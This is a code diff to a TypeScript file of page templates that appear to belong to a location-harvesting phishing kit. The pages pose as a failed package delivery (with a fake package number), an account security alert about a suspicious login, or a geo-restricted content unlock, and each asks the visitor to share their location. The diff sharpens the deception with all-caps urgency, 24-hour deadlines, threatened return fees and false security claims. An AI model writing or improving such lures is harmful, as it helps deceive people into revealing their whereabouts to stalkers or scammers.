@@ -20,30 +20,30 @@ interface TemplateContent {
 
 const templateContent: Record<string, TemplateContent> = {
   'package-delivery-issue': {
-    title: 'Action Required: Package Delivery Issue',
-    actionText: 'Verify Delivery Address & Reschedule',
-    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
-    pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
+    title: "URGENT: Delivery Failure - Action Required for Package #TZ78391B",
+    message: "CRITICAL ALERT: We were unable to deliver your package #TZ78391B. Immediate location verification is needed to reschedule or redirect your shipment and avoid return fees.",
+    pageSpecificMessage: "Your package #TZ78391B is on hold due to a delivery address discrepancy. Verify your current location NOW to confirm your address or select an urgent pickup point. Failure to act within 24 hours may result in package return.",
+    actionText: "VERIFY LOCATION & PREVENT RETURN",
     heroIcon: Truck,
   },
   'security-alert': {
-    title: 'Urgent: Account Security Action Required',
-    actionText: 'Verify Location & Secure Account',
-    message: "SECURITY ALERT: Unusual Account Activity Detected",
-    pageSpecificMessage: "We have identified suspicious activity associated with your account. To ensure your account's safety and prevent unauthorized access, please verify your current location immediately. This is a critical security measure. Your prompt attention is appreciated.",
+    title: "IMMEDIATE ACTION REQUIRED: Unusual Login Attempt Detected",
+    message: "URGENT SECURITY ALERT: We've detected a suspicious login attempt on your account from an unrecognized location. Verify your current location immediately to secure your account.",
+    pageSpecificMessage: "Your account safety is our priority. An unusual login was flagged. Confirm your location now to prevent potential unauthorized access. This is a time-sensitive security measure.",
+    actionText: "SECURE ACCOUNT & VERIFY LOCATION NOW",
     heroIcon: ShieldAlert,
   },
   'content-unlock': {
-    title: 'Unlock Exclusive Local Content',
-    actionText: 'Verify Location to Access',
-    message: 'this content is blocked in some areas.',
-    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
+    title: "Exclusive Content Unlocked: Verify Region",
+    message: "You've gained access to premium local content! Just verify your location to unlock videos, articles, and downloads restricted in other regions.",
+    pageSpecificMessage: "Congratulations! Access exclusive content (videos, files, articles) available only in your current region. A quick location check is required to unlock these special features.",
+    actionText: "Access Geo-Restricted Content",
     heroIcon: Lock,
   },
   default: {
-    title: 'Location Verification Needed',
-    actionText: 'Verify My Location',
-    message: 'Please share your location to continue using this service.',
+    title: "Location Verification Required for Service Access",
+    message: "To continue using this premium service and for compliance with regional settings, please share your location.",
+    actionText: "Verify Location to Continue",
     heroIcon: MapPin,
   }
 };
